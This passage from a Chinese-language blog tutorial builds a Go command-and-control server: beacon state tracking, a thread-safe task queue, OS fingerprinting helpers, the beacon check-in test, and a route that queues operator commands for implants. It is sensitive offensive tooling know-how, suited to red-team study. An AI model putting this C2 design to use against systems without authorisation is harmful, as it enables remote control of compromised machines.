<p><code>server/types.go</code>：补充Beacon结构体，包含Beacon的具体数据，是否存活，任务队列</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Beacon <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Data       response.BeaconData  </span><br><span class="line">    Tick       <span class="type">bool</span>  </span><br><span class="line">    Active     <span class="type">bool</span>  </span><br><span class="line">    TasksQueue *safeType.Slice  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>utils/safeType/slice.go</code> 加上“锁”的slice类型，避免资源竞争而导致的安全问题</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> safeType  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;sync&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> Slice <span class="keyword">struct</span> &#123;  </span><br><span class="line">    mutex sync.RWMutex  </span><br><span class="line">    items []<span class="keyword">interface</span>&#123;&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> SliceItem <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Index <span class="type">int</span>  </span><br><span class="line">    Item  <span class="keyword">interface</span>&#123;&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewSlice</span><span class="params">()</span></span> *Slice &#123;  </span><br><span class="line">    <span class="keyword">return</span> &amp;Slice&#123;&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sl *Slice)</span></span> Put(value <span class="keyword">interface</span>&#123;&#125;) &#123;  </span><br><span class="line">    sl.mutex.Lock()  </span><br><span class="line">    <span class="keyword">defer</span> sl.mutex.Unlock()  </span><br><span class="line">  </span><br><span class="line">    sl.items = <span class="built_in">append</span>(sl.items, value)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sl *Slice)</span></span> Get(index <span class="type">uint</span>) (<span class="keyword">interface</span>&#123;&#125;, <span class="type">bool</span>) &#123;  </span><br><span class="line">    sl.mutex.RLock()  </span><br><span class="line">    <span class="keyword">defer</span> sl.mutex.RUnlock()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> index &lt; <span class="number">0</span> || index &gt;= <span class="type">uint</span>(<span class="built_in">len</span>(sl.items)) &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">false</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> sl.items[index], <span class="literal">true</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sl *Slice)</span></span> Delete(index <span class="type">uint</span>) &#123;  </span><br><span class="line">    sl.mutex.Lock()  </span><br><span class="line">    <span class="keyword">defer</span> sl.mutex.Unlock()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> index &lt; <span class="number">0</span> || index &gt;= <span class="type">uint</span>(<span class="built_in">len</span>(sl.items)) &#123;  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    sl.items = <span class="built_in">append</span>(sl.items[:index], sl.items[index+<span class="number">1</span>:]...)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sl *Slice)</span></span> DirectLock() &#123;  </span><br><span class="line">    sl.mutex.RLock()  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sl *Slice)</span></span> DirectUnlock() &#123;  </span><br><span class="line">    sl.mutex.RUnlock()  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sl *Slice)</span></span> DirectSlice() []<span class="keyword">interface</span>&#123;&#125; &#123;  </span><br><span class="line">    <span class="keyword">return</span> sl.items  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sl *Slice)</span></span> CutArray() []<span class="keyword">interface</span>&#123;&#125; &#123;  </span><br><span class="line">    sl.mutex.Lock()  </span><br><span class="line">    <span class="keyword">defer</span> sl.mutex.Unlock()  </span><br><span class="line">  </span><br><span class="line">    array := sl.items  </span><br><span class="line">    sl.items = <span class="built_in">make</span>([]<span class="keyword">interface</span>&#123;&#125;, <span class="number">0</span>)  </span><br><span class="line">    <span class="keyword">return</span> array  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sl *Slice)</span></span> Len() <span class="type">uint</span> &#123;  </span><br><span class="line">    sl.mutex.RLock()  </span><br><span class="line">    <span class="keyword">defer</span> sl.mutex.RUnlock()  </span><br><span class="line">    <span class="keyword">return</span> <span class="type">uint</span>(<span class="built_in">len</span>(sl.items))  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sl *Slice)</span></span> Iterator() &lt;-<span class="keyword">chan</span> SliceItem &#123;  </span><br><span class="line">  </span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> SliceItem)  </span><br><span class="line">  </span><br><span class="line">    sl.mutex.RLock()  </span><br><span class="line">    copyItems := <span class="built_in">make</span>([]<span class="keyword">interface</span>&#123;&#125;, <span class="built_in">len</span>(sl.items))  </span><br><span class="line">    <span class="built_in">copy</span>(copyItems, sl.items)  </span><br><span class="line">    sl.mutex.RUnlock()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;  </span><br><span class="line">       <span class="keyword">defer</span> <span class="built_in">close</span>(ch)  </span><br><span class="line">       <span class="keyword">for</span> i, item := <span class="keyword">range</span> copyItems &#123;  </span><br><span class="line">          ch &lt;- SliceItem&#123;Index: i, Item: item&#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;()  </span><br><span class="line">    <span class="keyword">return</span> ch  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/types.go</code>：补充代码页和一些常量</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> codePageMapping = <span class="keyword">map</span>[<span class="type">int</span>]encoding.Encoding&#123;  </span><br><span class="line">    <span class="number">037</span>:   charmap.CodePage037,   <span class="comment">// IBM EBCDIC US-Canada  </span></span><br><span class="line">    <span class="number">437</span>:   charmap.CodePage437,   <span class="comment">// OEM United States  </span></span><br><span class="line">    <span class="number">850</span>:   charmap.CodePage850,   <span class="comment">// Western European (DOS)  </span></span><br><span class="line">    <span class="number">852</span>:   charmap.CodePage852,   <span class="comment">// Central European (DOS)  </span></span><br><span class="line">    <span class="number">855</span>:   charmap.CodePage855,   <span class="comment">// OEM Cyrillic (primarily Russian)  </span></span><br><span class="line">    <span class="number">858</span>:   charmap.CodePage858,   <span class="comment">// OEM Multilingual Latin 1 + Euro  </span></span><br><span class="line">    <span class="number">860</span>:   charmap.CodePage860,   <span class="comment">// Portuguese (DOS)  </span></span><br><span class="line">    <span class="number">862</span>:   charmap.CodePage862,   <span class="comment">// Hebrew (DOS)  </span></span><br><span class="line">    <span class="number">863</span>:   charmap.CodePage863,   <span class="comment">// French Canadian (DOS)  </span></span><br><span class="line">    <span class="number">865</span>:   charmap.CodePage865,   <span class="comment">// Nordic (DOS)  </span></span><br><span class="line">    <span class="number">866</span>:   charmap.CodePage866,   <span class="comment">// Russian (DOS)  </span></span><br><span class="line">    <span class="number">936</span>:   simplifiedchinese.GBK, <span class="comment">// Chinese (GBK)  </span></span><br><span class="line">    <span class="number">1047</span>:  charmap.CodePage1047,  <span class="comment">// IBM EBCDIC Latin 1/Open System  </span></span><br><span class="line">    <span class="number">1140</span>:  charmap.CodePage1140,  <span class="comment">// IBM EBCDIC US-Canada with Euro  </span></span><br><span class="line">    <span class="number">1250</span>:  charmap.Windows1250,   <span class="comment">// Central European (Windows)  </span></span><br><span class="line">    <span class="number">1251</span>:  charmap.Windows1251,   <span class="comment">// Cyrillic (Windows)  </span></span><br><span class="line">    <span class="number">1252</span>:  charmap.Windows1252,   <span class="comment">// Western European (Windows)  </span></span><br><span class="line">    <span class="number">1253</span>:  charmap.Windows1253,   <span class="comment">// Greek (Windows)  </span></span><br><span class="line">    <span class="number">1254</span>:  charmap.Windows1254,   <span class="comment">// Turkish (Windows)  </span></span><br><span class="line">    <span class="number">1255</span>:  charmap.Windows1255,   <span class="comment">// Hebrew (Windows)  </span></span><br><span class="line">    <span class="number">1256</span>:  charmap.Windows1256,   <span class="comment">// Arabic (Windows)  </span></span><br><span class="line">    <span class="number">1257</span>:  charmap.Windows1257,   <span class="comment">// Baltic (Windows)  </span></span><br><span class="line">    <span class="number">1258</span>:  charmap.Windows1258,   <span class="comment">// Vietnamese (Windows)  </span></span><br><span class="line">    <span class="number">20866</span>: charmap.KOI8R,         <span class="comment">// Russian (KOI8-R)  </span></span><br><span class="line">    <span class="number">21866</span>: charmap.KOI8U,         <span class="comment">// Ukrainian (KOI8-U)  </span></span><br><span class="line">    <span class="number">28591</span>: charmap.ISO8859_1,     <span class="comment">// Western European (ISO 8859-1)  </span></span><br><span class="line">    <span class="number">28592</span>: charmap.ISO8859_2,     <span class="comment">// Central European (ISO 8859-2)  </span></span><br><span class="line">    <span class="number">28593</span>: charmap.ISO8859_3,     <span class="comment">// Latin 3 (ISO 8859-3)  </span></span><br><span class="line">    <span class="number">28594</span>: charmap.ISO8859_4,     <span class="comment">// Baltic (ISO 8859-4)  </span></span><br><span class="line">    <span class="number">28595</span>: charmap.ISO8859_5,     <span class="comment">// Cyrillic (ISO 8859-5)  </span></span><br><span class="line">    <span class="number">28596</span>: charmap.ISO8859_6,     <span class="comment">// Arabic (ISO 8859-6)  </span></span><br><span class="line">    <span class="number">28597</span>: charmap.ISO8859_7,     <span class="comment">// Greek (ISO 8859-7)  </span></span><br><span class="line">    <span class="number">28598</span>: charmap.ISO8859_8,     <span class="comment">// Hebrew (ISO 8859-8)  </span></span><br><span class="line">    <span class="number">28599</span>: charmap.ISO8859_9,     <span class="comment">// Turkish (ISO 8859-9)  </span></span><br><span class="line">    <span class="number">28605</span>: charmap.ISO8859_15,    <span class="comment">// Latin 9 (ISO 8859-15)  </span></span><br><span class="line">    <span class="number">65001</span>: encoding.Nop,          <span class="comment">// Unicode (UTF-8)  </span></span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> (  </span><br><span class="line">    OS_UNKNOWN = <span class="number">0</span>  </span><br><span class="line">    OS_WINDOWS = <span class="number">1</span>  </span><br><span class="line">    OS_LINUX   = <span class="number">2</span>  </span><br><span class="line">    OS_MAC     = <span class="number">3</span>  </span><br><span class="line">  </span><br><span class="line">    TYPE_TASK       = <span class="number">1</span>  </span><br><span class="line">    MESSAGE_INFO    = <span class="number">5</span>  </span><br><span class="line">    MESSAGE_ERROR   = <span class="number">6</span>  </span><br><span class="line">    MESSAGE_SUCCESS = <span class="number">7</span>  </span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/beacon_utils.go</code> 包含三个工具函数分别解决了<strong>编码转换、系统识别、IP 转换</strong></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> beacon  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;golang.org/x/text/transform&quot;</span>  </span><br><span class="line">    <span class="string">&quot;io&quot;</span>    </span><br><span class="line">    <span class="string">&quot;net&quot;</span>    </span><br><span class="line">    <span class="string">&quot;regexp&quot;</span>    </span><br><span class="line">    <span class="string">&quot;strconv&quot;</span>    </span><br><span class="line">    <span class="string">&quot;strings&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConvertCpToUTF8</span><span class="params">(input <span class="type">string</span>, codePage <span class="type">int</span>)</span></span> <span class="type">string</span> &#123;  </span><br><span class="line">    enc, exists := codePageMapping[codePage]  </span><br><span class="line">    <span class="keyword">if</span> !exists &#123;  </span><br><span class="line">       <span class="keyword">return</span> input  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    reader := transform.NewReader(strings.NewReader(input), enc.NewDecoder())  </span><br><span class="line">    utf8Text, err := io.ReadAll(reader)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> input  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="type">string</span>(utf8Text)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetOsVersion</span><span class="params">(majorVersion <span class="type">uint8</span>, minorVersion <span class="type">uint8</span>, buildNumber <span class="type">uint</span>, isServer <span class="type">bool</span>, systemArch <span class="type">string</span>)</span></span> (<span class="type">int</span>, <span class="type">string</span>) &#123;  </span><br><span class="line">    <span class="keyword">var</span> (  </span><br><span class="line">       desc <span class="type">string</span>  </span><br><span class="line">       os   = OS_UNKNOWN  </span><br><span class="line">    )  </span><br><span class="line">  </span><br><span class="line">    osVersion := <span class="string">&quot;unknown&quot;</span>  </span><br><span class="line">    <span class="keyword">if</span> majorVersion == <span class="number">10</span> &amp;&amp; minorVersion == <span class="number">0</span> &amp;&amp; isServer &amp;&amp; buildNumber &gt;= <span class="number">19045</span> &#123;  </span><br><span class="line">       osVersion = <span class="string">&quot;Win 2022 Serv&quot;</span>  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> majorVersion == <span class="number">10</span> &amp;&amp; minorVersion == <span class="number">0</span> &amp;&amp; isServer &amp;&amp; buildNumber &gt;= <span class="number">17763</span> &#123;  </span><br><span class="line">       osVersion = <span class="string">&quot;Win 2019 Serv&quot;</span>  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> majorVersion == <span class="number">10</span> &amp;&amp; minorVersion == <span class="number">0</span> &amp;&amp; !isServer &amp;&amp; buildNumber &gt;= <span class="number">22000</span> &#123;  </span><br><span class="line">       osVersion = <span class="string">&quot;Win 11&quot;</span>  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> majorVersion == <span class="number">10</span> &amp;&amp; minorVersion == <span class="number">0</span> &amp;&amp; isServer &#123;  </span><br><span class="line">       osVersion = <span class="string">&quot;Win 2016 Serv&quot;</span>  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> majorVersion == <span class="number">10</span> &amp;&amp; minorVersion == <span class="number">0</span> &#123;  </span><br><span class="line">       osVersion = <span class="string">&quot;Win 10&quot;</span>  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> majorVersion == <span class="number">6</span> &amp;&amp; minorVersion == <span class="number">3</span> &amp;&amp; isServer &#123;  </span><br><span class="line">       osVersion = <span class="string">&quot;Win Serv 2012 R2&quot;</span>  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> majorVersion == <span class="number">6</span> &amp;&amp; minorVersion == <span class="number">3</span> &#123;  </span><br><span class="line">       osVersion = <span class="string">&quot;Win 8.1&quot;</span>  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> majorVersion == <span class="number">6</span> &amp;&amp; minorVersion == <span class="number">2</span> &amp;&amp; isServer &#123;  </span><br><span class="line">       osVersion = <span class="string">&quot;Win Serv 2012&quot;</span>  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> majorVersion == <span class="number">6</span> &amp;&amp; minorVersion == <span class="number">2</span> &#123;  </span><br><span class="line">       osVersion = <span class="string">&quot;Win 8&quot;</span>  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> majorVersion == <span class="number">6</span> &amp;&amp; minorVersion == <span class="number">1</span> &amp;&amp; isServer &#123;  </span><br><span class="line">       osVersion = <span class="string">&quot;Win Serv 2008 R2&quot;</span>  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> majorVersion == <span class="number">6</span> &amp;&amp; minorVersion == <span class="number">1</span> &#123;  </span><br><span class="line">       osVersion = <span class="string">&quot;Win 7&quot;</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    desc = osVersion + <span class="string">&quot; &quot;</span> + systemArch  </span><br><span class="line">    <span class="keyword">if</span> strings.Contains(osVersion, <span class="string">&quot;Win&quot;</span>) &#123;  </span><br><span class="line">       os = OS_WINDOWS  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> os, desc  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">int32ToIPv4</span><span class="params">(ip <span class="type">uint</span>)</span></span> <span class="type">string</span> &#123;  </span><br><span class="line">    bytes := []<span class="type">byte</span>&#123;  </span><br><span class="line">       <span class="type">byte</span>(ip),  </span><br><span class="line">       <span class="type">byte</span>(ip &gt;&gt; <span class="number">8</span>),  </span><br><span class="line">       <span class="type">byte</span>(ip &gt;&gt; <span class="number">16</span>),  </span><br><span class="line">       <span class="type">byte</span>(ip &gt;&gt; <span class="number">24</span>),  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> net.IP(bytes).String()  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<h2 id="4-4-测试"><a href="#4-4-测试" class="headerlink" title="4.4 测试"></a>4.4 测试</h2><p>①以调式的方式启动服务器，请在需要的地方下断点，比如说 <code>handler/listener/http_listener.go</code> 的processRequest！</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/07/31/21-45-21-7334be22bb74c4a3618c0bee1a82363f-20250731214520-364b02.png"></p>
<p>②postman发送监听器创建请求，不需要生成Beacon操作，为了调式分析方便将配置硬编码到Beacon里了</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/07/31/21-34-44-02230f74039406e24c5b9216afabe9d0-20250731213444-0cb672.png"></p>
<p>③Beacon启动</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/07/31/21-37-54-125274c673fcc7b86f5ca2226851b91d-20250731213754-6f26d8.png"></p>
<p>④我们忽略一些过程，直接看TeamServer是否有Beacon的数据</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/07/31/21-50-05-498eb4673894012d563122368af88e03-20250731215005-ecb065.png"></p>
<p>⑤如果创建成功，服务器会发送状态码200，下图是Beacon的控制台输出</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/07/31/21-43-47-854429c6db228cb9a58e649e8c0f52bb-20250731214347-f24f87.png"></p>
<h1 id="五、任务下发"><a href="#五、任务下发" class="headerlink" title="五、任务下发"></a>五、任务下发</h1><p>Beacon完成上线后，就可以向其下发任务了，任务不会立即的发送给Beacon端，而是存储在Server的beacon对象的任务队列中。当Beacon通过Get方式获取任务时，服务器根据beaconid从指定beacon的任务队列中取出任务并打包成<strong>任务包</strong>发送给beacon让其执行。</p>
<p><strong>任务包</strong>长什么样子呢？一个任务包&#x3D;任务包的长度（不包含长度字段，4B）+任务ID（4B）+任务数据（任务类型4B+Args）</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/08/02/15-13-47-c8e830742a512999766e2a657e965949-%E4%BB%BB%E5%8A%A1%E5%8C%85-0a77cd.png" alt="任务包.png"></p>
<p><strong>任务创建</strong>代码编写顺序：Controller.InitRouter-&gt;Controller.BeaconCommandExecute-&gt;TeamServer.BeaconCommand-&gt;Handler.BeaconCommand-&gt;beaconHandler.BeaconCommand-&gt;beaconHandler.CreateTask-&gt;TeamServer.TaskCreate</p>
<p><strong>任务获取</strong>代码编写顺序：HTTP.processRequest-&gt;TeamServer.BeaconGetAllTasks-&gt;TeamServer.TaskGetAll-&gt;Handler.BeaconPackData-&gt;beaconHandler.BeaconPackData-&gt;beaconHandler.BeaconHandler-&gt;beaconHandler.EncryptData</p>
<p>上面的编写顺序只包含主逻辑相关函数，一些工具函数就没列举出来了，具体看下面的代码编写</p>
<h2 id="5-1-任务创建"><a href="#5-1-任务创建" class="headerlink" title="5.1 任务创建"></a>5.1 任务创建</h2><p><code>controller/controller.go</code> 增加一条”&#x2F;beacon&#x2F;command&#x2F;execute”路由</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Controller)</span></span> InitRouter() &#123;  </span><br><span class="line">  </span><br><span class="line">    apiGroup := c.Engine.Group(c.Endpoint)  </span><br><span class="line">  </span><br><span class="line">    apiGroup.GET(<span class="string">&quot;/test&quot;</span>, c.Test)  </span><br><span class="line">    apiGroup.POST(<span class="string">&quot;/listener/create&quot;</span>, c.ListenerStart)  </span><br><span class="line">    apiGroup.POST(<span class="string">&quot;/beacon/generate&quot;</span>, c.BeaconGenerate)  </span><br><span class="line">    apiGroup.POST(<span class="string">&quot;/beacon/command/execute&quot;</span>, c.BeaconCommandExecute)</span><br></pre></td></tr></table></figure>

<p><code>controller/beacon.go</code>：新增BeaconCommandExecute方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Controller)</span></span> BeaconCommandExecute(ctx *gin.Context) &#123;  </span><br><span class="line">    <span class="keyword">var</span> (  </span><br><span class="line">       username    <span class="type">string</span>  </span><br><span class="line">       commandData request.CommandData  </span><br><span class="line">       err         <span class="type">error</span>  </span><br><span class="line">    )  </span><br><span class="line">  </span><br><span class="line">    err = ctx.ShouldBindJSON(&amp;commandData)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       logs.Logger.Error(<span class="string">&quot;Error in binding JSON data: &quot;</span>, zap.Error(err))  </span><br><span class="line">       ctx.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;code&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: err.Error()&#125;)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    username = <span class="string">&quot;oneday&quot;</span>  </span><br><span class="line">  </span><br><span class="line">    err = c.TeamServer.BeaconCommand(commandData.BeaconType, commandData.BeaconId, username, commandData.CmdLine, commandData.Data)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       ctx.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;message&quot;</span>: err.Error(), <span class="string">&quot;ok&quot;</span>: <span class="literal">false</span>&#125;)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    ctx.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Beacon command task submitted successfully&quot;</span>, <span class="string">&quot;ok&quot;</span>: <span class="literal">true</span>&#125;)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>utils/request/beacon.go</code> 接收前端CommandData的json数据</p>
